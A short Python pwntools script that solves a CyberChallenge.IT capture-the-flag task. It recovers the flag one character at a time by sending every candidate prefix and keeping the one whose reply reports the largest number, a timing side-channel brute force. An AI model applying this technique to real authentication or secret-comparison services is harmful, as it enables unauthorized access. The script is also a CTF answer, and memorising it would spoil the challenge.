from pwn import *
import re

host = 'benchmark.challs.cyberchallenge.it'
port = 9031
challenge_server = remote(host, port)

def skip_intro():
    for i in range(5):
        challenge_server.recvline()

times_dictionary={}

if __name__ == '__main__':
    skip_intro()
    flag = ''

    while '}' not in flag:
        for i in range(33, 126):
            challenge_server.recvline()
            challenge_server.sendline(flag+chr(i))
            stringa = challenge_server.recvline().decode()
            times_dictionary[int(re.findall(r'\d+', stringa)[0])] = chr(i)
            challenge_server.recvline()
        flag += times_dictionary[max(times_dictionary.keys())]
        print('Calculating flag: ',flag)
    
    print('full flag is: ', flag)
